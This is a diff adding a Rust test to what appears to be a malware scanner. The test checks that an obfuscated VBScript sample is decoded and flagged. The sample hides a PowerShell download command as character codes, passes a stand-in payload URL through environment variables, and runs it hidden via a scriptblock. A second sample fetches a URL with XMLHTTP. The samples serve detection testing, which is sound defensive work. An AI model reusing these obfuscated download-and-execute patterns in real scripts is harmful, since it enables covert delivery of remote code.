@@ -20527,6 +20527,52 @@ sh.Run cmd, 0, False"#
     }
 
     #[test]
+    fn standalone_vbs_env_scriptblock_payload_is_recovered() {
+        let mut env = Environment::new(&Config::default());
+        let url = "https://vbs-env-scriptblock.example/payload.ps1";
+        let ps = "Invoke-WebRequest -Uri $env:STAGE_URL";
+        let nums = ps
+            .bytes()
+            .map(|byte| byte.to_string())
+            .collect::<Vec<_>>()
+            .join(", ");
+        let vbs = format!(
+            r#"Dim sh, proc_env, payload, values, pair, i
+values = Array({nums})
+pair = Array("STAGE_URL", "{url}")
+payload = ""
+For i = 0 To UBound(values)
+    payload = payload & Chr(values(i))
+Next
+Set sh = CreateObject("WScript.Shell")
+Set proc_env = sh.Environment("Process")
+proc_env(pair(0)) = pair(1)
+proc_env("PAYLOAD") = payload
+sh.Run "powershell -Command ""&([scriptblock]::Create($env:PAYLOAD))""", 0, False"#
+        );
+        env.all_extracted_vbs.push(vbs.into_bytes());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        assert!(
+            env.all_extracted_ps1
+                .iter()
+                .any(|payload| String::from_utf8_lossy(payload)
+                    .contains("https://vbs-env-scriptblock.example/payload.ps1")),
+            "VBS env-backed scriptblock payload was not extracted: {:?}",
+            env.all_extracted_ps1
+        );
+        crate::ps1_scan::scan_ps1_payloads(&mut env);
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. }
+                    if src == "https://vbs-env-scriptblock.example/payload.ps1"
+            )),
+            "VBS env-backed scriptblock payload was not scanned as PS: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn standalone_vbs_execute_prefix_xmlhttp_url_extracted() {
         let vbs = br#"Execute "Set http = CreateObject(""MSXML2.XMLHTTP""): http.Open ""GET"", ""https://standalone-vbs-execute.example/payload.txt"", False: http.Send""#;
         let report = analyze(vbs, &Config::default());
